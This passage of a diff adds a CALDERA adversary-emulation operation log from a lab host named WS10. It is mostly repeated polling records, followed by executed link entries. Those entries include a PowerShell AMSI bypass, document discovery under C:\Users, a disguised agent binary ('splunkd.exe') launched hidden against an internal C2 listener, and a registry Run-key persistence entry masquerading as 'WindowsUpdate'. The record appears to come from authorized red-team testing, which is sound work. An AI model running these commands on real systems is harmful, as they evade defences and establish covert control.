+      "ts": "2026-04-02T08:10:36Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:39Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:42Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:45Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:47Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:50Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:53Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:55Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:10:58Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:01Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:04Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:06Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:09Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:12Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:14Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:17Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:20Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:23Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:26Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:28Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:31Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:34Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:37Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:40Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:42Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:45Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:48Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:51Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:54Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:56Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:11:59Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:02Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:05Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:07Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:10Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:13Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:15Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:18Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:21Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:24Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:26Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:29Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:32Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:35Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:37Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:40Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:43Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:46Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:48Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:51Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:54Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:57Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:12:59Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:02Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:05Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:08Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:10Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:13Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:16Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:19Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:21Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:24Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:27Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:29Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:32Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:35Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:38Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:40Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:43Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:46Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:49Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:52Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:55Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:13:58Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:01Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:04Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:06Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:09Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:12Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:15Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:18Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:21Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:23Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:26Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:29Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:31Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:34Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:37Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:40Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:42Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:45Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:48Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:51Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:53Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:56Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:14:59Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:01Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:04Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:07Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:10Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:12Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:15Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:18Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:21Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:23Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:26Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:29Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:32Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:34Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:37Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:40Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:43Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:46Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:49Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:52Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:54Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:15:57Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:00Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:03Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:05Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:27Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:30Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-02T08:16:33Z",
+      "state": "finished",
+      "links": 5,
+      "potential_links": 0,
+      "event_logs": 0
+    }
+  ],
+  "last_poll_utc": "2026-04-02T08:16:32Z",
+  "links": [
+    {
+      "id": "1819c5bc-8eca-48a6-9eef-fbecb36df769",
+      "paw": "fgdafj",
+      "command": "whoamiwhoami /privnet usernet localgroup administrators",
+      "plaintext_command": "whoamiwhoami /privnet usernet localgroup administrators",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-02T08:06:33Z",
+      "pin": 0,
+      "pid": "6104",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "1819c5bc-8eca-48a6-9eef-fbecb36df769",
+      "collect": "2026-04-02T08:06:39Z",
+      "finish": "2026-04-02T08:06:39Z",
+      "ability": {
+        "ability_id": "discovery_users",
+        "tactic": "discovery",
+        "technique_name": "System Owner/User Discovery",
+        "technique_id": "T1033",
+        "name": "User Discovery",
+        "description": "Enumerate current identity, privileges, and administrators.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-02T08:06:39Z"
+    },
+    {
+      "id": "420809c8-7777-4c24-bef8-677da2b7d67a",
+      "paw": "fgdafj",
+      "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+      "plaintext_command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)",
+      "status": 0,
+      "score": 0,
+      "decide": "2026-04-02T08:06:44Z",
+      "pin": 0,
+      "pid": "6684",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "420809c8-7777-4c24-bef8-677da2b7d67a",
+      "collect": "2026-04-02T08:07:31Z",
+      "finish": "2026-04-02T08:07:31Z",
+      "ability": {
+        "ability_id": "amsi_bypass",
+        "tactic": "defense-evasion",
+        "technique_name": "Impair Defenses",
+        "technique_id": "T1562.001",
+        "name": "AMSI Bypass",
+        "description": "Disable AMSI for the current PowerShell runspace.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "defense-evasion"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "False",
+      "deadman": false,
+      "agent_reported_time": "2026-04-02T08:07:31Z"
+    },
+    {
+      "id": "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35",
+      "paw": "fgdafj",
+      "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+      "plaintext_command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}",
+      "status": 0,
+      "score": 0,
+      "decide": "2026-04-02T08:07:32Z",
+      "pin": 0,
+      "pid": "4316",
+      "facts": [
+        {
+          "unique": "host.file.pathC:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt",
+          "trait": "host.file.path",
+          "name": "host.file.path",
+          "value": "C:\\Users\\Administrator\\Desktop\\Nuovo documento di testo.txt",
+          "created": "2026-04-02T08:08:14Z",
+          "score": 1,
+          "source": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+          "origin_type": "LEARNED",
+          "links": [
+            "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35"
+          ],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1005"
+        },
+        {
+          "unique": "host.file.pathC:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt",
+          "trait": "host.file.path",
+          "name": "host.file.path",
+          "value": "C:\\Users\\Administrator\\Downloads\\Sysmon\\Eula.txt",
+          "created": "2026-04-02T08:08:14Z",
+          "score": 1,
+          "source": "b5989196-5d0b-4eb8-9571-0dc52e4c654b",
+          "origin_type": "LEARNED",
+          "links": [
+            "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35"
+          ],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1005"
+        }
+      ],
+      "relationships": [],
+      "used": [],
+      "unique": "adbe4b12-2ce6-4f95-8c27-3d5b067d7f35",
+      "collect": "2026-04-02T08:08:12Z",
+      "finish": "2026-04-02T08:08:14Z",
+      "ability": {
+        "ability_id": "collection_files",
+        "tactic": "collection",
+        "technique_name": "Data from Local System",
+        "technique_id": "T1005",
+        "name": "Sensitive File Discovery",
+        "description": "Search for common document types under C:\\Users.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 120,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "collection"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 120,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-02T08:08:12Z"
+    },
+    {
+      "id": "77d32750-a1de-4499-85e5-8b77bdbd14e3",
+      "paw": "fgdafj",
+      "command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+      "plaintext_command": "Start-Process C:\\Users\\Public\\splunkd.exe `-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `-WindowStyle Hidden",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-02T08:08:14Z",
+      "pin": 0,
+      "pid": "9808",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "77d32750-a1de-4499-85e5-8b77bdbd14e3",
+      "collect": "2026-04-02T08:09:01Z",
+      "finish": "2026-04-02T08:09:01Z",
+      "ability": {
+        "ability_id": "c2_internal",
+        "tactic": "command-and-control",
+        "technique_name": "Application Layer Protocol",
+        "technique_id": "T1071.001",
+        "name": "Internal C2",
+        "description": "Start an agent process against the internal CALDERA HTTP listener.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "command-and-control"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-02T08:09:00Z"
+    },
+    {
+      "id": "4d6ab1d9-1447-493f-b276-eead40153cbb",
+      "paw": "fgdafj",
+      "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+      "plaintext_command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `-Name \"WindowsUpdate\" `-Value \"C:\\Users\\Public\\splunkd.exe\" -Force",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-02T08:09:02Z",
+      "pin": 0,
+      "pid": "5168",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "4d6ab1d9-1447-493f-b276-eead40153cbb",
+      "collect": "2026-04-02T08:09:49Z",
+      "finish": "2026-04-02T08:09:49Z",
+      "ability": {
+        "ability_id": "persistence_registry",
+        "tactic": "persistence",
+        "technique_name": "Registry Run Keys / Startup Folder",
+        "technique_id": "T1547.001",
+        "name": "Registry Persistence",
+        "description": "Create a Run key for persistence.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "persistence"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "",
+        "delete_payload": true
+      },
+      "executor": {
